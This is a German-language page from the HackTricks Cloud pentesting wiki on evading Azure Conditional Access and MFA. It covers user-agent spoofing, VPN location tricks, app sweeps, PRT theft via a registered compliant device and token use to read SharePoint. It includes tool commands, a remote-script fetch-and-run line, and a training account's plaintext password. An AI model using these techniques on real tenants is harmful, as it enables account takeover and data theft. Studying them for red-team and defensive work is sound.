# Az - Conditional Access Policies & MFA Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Grundinformationen

Azure Conditional Access-Richtlinien sind Regeln, die in Microsoft Azure eingerichtet sind, um Zugriffskontrollen f√ºr Azure-Dienste und -Anwendungen basierend auf bestimmten **Bedingungen** durchzusetzen. Diese Richtlinien helfen Organisationen, ihre Ressourcen zu sichern, indem sie die richtigen Zugriffskontrollen unter den richtigen Umst√§nden anwenden.\
Conditional Access-Richtlinien **definieren** im Wesentlichen **Wer** auf **Was** von **Wo** und **Wie** zugreifen kann.

Hier sind ein paar Beispiele:

1. **Anmelderisiko-Richtlinie**: Diese Richtlinie k√∂nnte so eingestellt werden, dass sie eine Multi-Faktor-Authentifizierung (MFA) erfordert, wenn ein Anmelderisiko erkannt wird. Zum Beispiel, wenn das Anmeldeverhalten eines Benutzers im Vergleich zu seinem regul√§ren Muster ungew√∂hnlich ist, wie z.B. das Anmelden aus einem anderen Land, kann das System zus√§tzliche Authentifizierung anfordern.
2. **Ger√§te-Compliance-Richtlinie**: Diese Richtlinie kann den Zugriff auf Azure-Dienste nur auf Ger√§te beschr√§nken, die den Sicherheitsstandards der Organisation entsprechen. Beispielsweise k√∂nnte der Zugriff nur von Ger√§ten erlaubt werden, die √ºber aktuelle Antivirensoftware verf√ºgen oder eine bestimmte Betriebssystemversion ausf√ºhren.

## Umgehungen von Conditional Access-Richtlinien

Es ist m√∂glich, dass eine Conditional Access-Richtlinie **einige Informationen √ºberpr√ºft, die leicht manipuliert werden k√∂nnen, was eine Umgehung der Richtlinie erm√∂glicht**. Und wenn beispielsweise die Richtlinie MFA konfiguriert hat, kann der Angreifer sie umgehen.

Bei der Konfiguration einer Conditional Access-Richtlinie ist es erforderlich, die **betroffenen Benutzer** und **Zielressourcen** (wie alle Cloud-Apps) anzugeben.

Es ist auch notwendig, die **Bedingungen** zu konfigurieren, die die Richtlinie **ausl√∂sen**:

* **Netzwerk**: IP, IP-Bereiche und geografische Standorte
* Kann umgangen werden, indem ein VPN oder Proxy verwendet wird, um sich mit einem Land zu verbinden oder sich von einer erlaubten IP-Adresse anzumelden
* **Microsoft-Risiken**: Benutzer-Risiko, Anmelderisiko, Insider-Risiko
* **Ger√§teplattformen**: Jedes Ger√§t oder Auswahl von Android, iOS, Windows Phone, Windows, macOS, Linux
* Wenn ‚ÄûJedes Ger√§t‚Äú nicht ausgew√§hlt ist, aber alle anderen Optionen ausgew√§hlt sind, ist es m√∂glich, dies mit einem zuf√§lligen User-Agent zu umgehen, der nicht mit diesen Plattformen in Verbindung steht
* **Client-Apps**: Optionen sind ‚ÄûBrowser‚Äú, ‚ÄûMobile Apps und Desktop-Clients‚Äú, ‚ÄûExchange ActiveSync-Clients‚Äú und ‚ÄûAndere Clients‚Äú
* Um die Anmeldung mit einer nicht ausgew√§hlten Option zu umgehen
* **Filter f√ºr Ger√§te**: Es ist m√∂glich, eine Regel in Bezug auf das verwendete Ger√§t zu erstellen
* **Authentifizierungsfl√ºsse**: Optionen sind ‚ÄûGer√§tescodefluss‚Äú und ‚ÄûAuthentifizierungs√ºbertragung‚Äú
* Dies wird einen Angreifer nicht betreffen, es sei denn, er versucht, einen dieser Protokolle in einem Phishing-Versuch zu missbrauchen, um auf das Konto des Opfers zuzugreifen

Die m√∂glichen **Ergebnisse** sind: Zugriff blockieren oder gew√§hren mit potenziellen Bedingungen wie MFA erforderlich, Ger√§t muss konform sein‚Ä¶

### Ger√§teplattformen - Ger√§tebedingung

Es ist m√∂glich, eine Bedingung basierend auf der **Ger√§teplattform** (Android, iOS, Windows, macOS...) festzulegen, jedoch basiert dies auf dem **User-Agent**, sodass es leicht umgangen werden kann. Selbst wenn **alle Optionen MFA erzwingen**, wenn Sie einen **User-Agent verwenden, der nicht erkannt wird,** k√∂nnen Sie die MFA oder Blockierung umgehen:

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Es reicht aus, den Browser **einen unbekannten User-Agent** (wie `Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile`) senden zu lassen, um diese Bedingung nicht auszul√∂sen.\
Sie k√∂nnen den User-Agent **manuell** in den Entwicklertools √§ndern:

<figure><img src="../../../.gitbook/assets/image (351).png" alt="" width="375"><figcaption></figcaption></figure>

&#x20;Oder verwenden Sie eine [Browsererweiterung wie diese](https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg?hl=en).

### Standorte: L√§nder, IP-Bereiche - Ger√§tebedingung

Wenn dies in der Conditional Access-Richtlinie festgelegt ist, k√∂nnte ein Angreifer einfach ein **VPN** im **erlaubten Land** verwenden oder versuchen, einen Weg zu finden, um von einer **erlaubten IP-Adresse** aus auf diese Bedingungen zuzugreifen.

### Cloud-Apps

Es ist m√∂glich, **Conditional Access-Richtlinien zu konfigurieren, um zu blockieren oder zu erzwingen**, beispielsweise MFA, wenn ein Benutzer versucht, auf eine **bestimmte App** zuzugreifen:

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

Um zu versuchen, diesen Schutz zu umgehen, sollten Sie sehen, ob Sie **nur in eine Anwendung** gelangen k√∂nnen.\
Das Tool [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep) hat **Dutzende von Anwendungs-IDs fest codiert** und wird versuchen, sich bei ihnen anzumelden und Ihnen Bescheid geben und Ihnen sogar das Token geben, wenn es erfolgreich ist.

Um **spezifische Anwendungs-IDs in spezifischen Ressourcen zu testen**, k√∂nnten Sie auch ein Tool wie verwenden:

{% code overflow="wrap" %}
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokens-stdout

<token>
```
{% endcode %}

Dar√ºber hinaus ist es auch m√∂glich, die Anmeldemethode zu sch√ºtzen (z. B. wenn Sie versuchen, sich √ºber den Browser oder eine Desktop-Anwendung anzumelden). Das Tool [**Invoke-MFASweep**](az-conditional-access-policies-mfa-bypass.md#invoke-mfasweep) f√ºhrt einige √úberpr√ºfungen durch, um zu versuchen, diese Schutzma√ünahmen zu umgehen.

Das Tool [**donkeytoken**](az-conditional-access-policies-mfa-bypass.md#donkeytoken) k√∂nnte ebenfalls f√ºr √§hnliche Zwecke verwendet werden, obwohl es unmaintained aussieht.

Das Tool [**ROPCI**](https://github.com/wunderwuzzi23/ropci) kann ebenfalls verwendet werden, um diese Schutzma√ünahmen zu testen und zu sehen, ob es m√∂glich ist, MFAs oder Sperren zu umgehen, aber dieses Tool funktioniert aus einer **whitebox** Perspektive. Zuerst m√ºssen Sie die Liste der im Mandanten erlaubten Apps herunterladen und dann wird es versuchen, sich bei ihnen anzumelden.

## Andere Az MFA Umgehungen

### Klingelton

Eine Azure MFA-Option besteht darin, **einen Anruf an die konfigurierte Telefonnummer zu erhalten**, bei dem der Benutzer gebeten wird, **das Zeichen `#` zu senden**.

{% hint style="danger" %}
Da Zeichen nur **T√∂ne** sind, k√∂nnte ein Angreifer die **Voicemail**-Nachricht der Telefonnummer **kompromittieren**, die Nachricht als **Ton von `#`** konfigurieren und dann, wenn die MFA angefordert wird, sicherstellen, dass das **Telefon des Opfers besetzt ist** (indem er anruft), sodass der Azure-Anruf an die Voicemail umgeleitet wird.
{% endhint %}

### Konforme Ger√§te

Richtlinien verlangen oft ein konformes Ger√§t oder MFA, sodass ein **Angreifer ein konformes Ger√§t registrieren**, ein **PRT**-Token erhalten und **auf diese Weise die MFA umgehen** k√∂nnte.

Beginnen Sie mit der Registrierung eines **konformen Ger√§ts in Intune**, dann **erhalten Sie das PRT** mit:
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
Finden Sie weitere Informationen zu dieser Art von Angriff auf der folgenden Seite:

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## Tooling

### [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep)

Dieses Skript erh√§lt einige Benutzeranmeldeinformationen und √ºberpr√ºft, ob es sich bei einigen Anwendungen anmelden kann.

Dies ist n√ºtzlich, um zu sehen, ob Sie **kein MFA ben√∂tigen, um sich bei einigen Anwendungen anzumelden**, die Sie sp√§ter m√∂glicherweise missbrauchen, um **Privilegien zu eskalieren**.

### [roadrecon](https://github.com/dirkjanm/ROADtools)

Holen Sie sich alle Richtlinien.
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep ist ein PowerShell-Skript, das versucht, **sich mit einem bereitgestellten Satz von Anmeldeinformationen bei verschiedenen Microsoft-Diensten anzumelden und zu identifizieren, ob MFA aktiviert ist**. Je nachdem, wie die bedingten Zugriffsrichtlinien und andere Einstellungen zur Multi-Faktor-Authentifizierung konfiguriert sind, k√∂nnen einige Protokolle als Einzel-Faktor verbleiben. Es gibt auch eine zus√§tzliche √úberpr√ºfung der ADFS-Konfigurationen und kann versuchen, sich beim lokalen ADFS-Server anzumelden, wenn dieser erkannt wird.
```bash
Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1").Content
Invoke-MFASweep -Username <username> -Password <pass>
```
### [ROPCI](https://github.com/wunderwuzzi23/ropci)

Dieses Tool hat dabei geholfen, MFA-Umgehungen zu identifizieren und dann APIs in mehreren Produktions-AAD-Mandanten auszunutzen, bei denen AAD-Kunden glaubten, dass MFA durchgesetzt war, aber die Authentifizierung basierend auf ROPC erfolgreich war.

{% hint style="success" %}
Sie m√ºssen die Berechtigungen haben, um alle Anwendungen aufzulisten, um die Liste der Apps zu generieren, die brute-forced werden sollen.
{% endhint %}
```bash
./ropci configure
./ropci apps list --all --format json -o apps.json
./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
./ropci auth bulk -i apps.csv -o results.json
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token ist eine Reihe von Funktionen, die Sicherheitsberatern helfen sollen, die Conditional Access Policies zu validieren, Tests f√ºr 2FA-aktivierte Microsoft-Portale usw. durchzuf√ºhren.

<pre class="language-powershell"><code class="lang-powershell"><strong>git clone https://github.com/silverhack/donkeytoken.git
</strong><strong>Import-Module '.\donkeytoken' -Force
</strong></code></pre>

**Testen Sie jedes Portal**, ob es m√∂glich ist, sich **ohne MFA** anzumelden:
```powershell
$username = "conditional-access-app-user@azure.training.hacktricks.xyz"
$password = ConvertTo-SecureString "Poehurgi78633" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-MFATest -credential $cred -Verbose -Debug -InformationAction Continue
```
Weil das **Azure** **Portal** **nicht eingeschr√§nkt** ist, ist es m√∂glich, ein **Token vom Portal-Endpunkt zu sammeln, um auf jeden Dienst zuzugreifen, der durch die vorherige Ausf√ºhrung erkannt wurde**. In diesem Fall wurde Sharepoint identifiziert, und ein Token zum Zugriff darauf wird angefordert:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

Angenommen, das Token hat die Berechtigung Sites.Read.All (von Sharepoint), selbst wenn Sie aufgrund von MFA nicht auf Sharepoint √ºber das Web zugreifen k√∂nnen, ist es m√∂glich, das Token zu verwenden, um auf die Dateien mit dem generierten Token zuzugreifen:
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## Referenzen

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
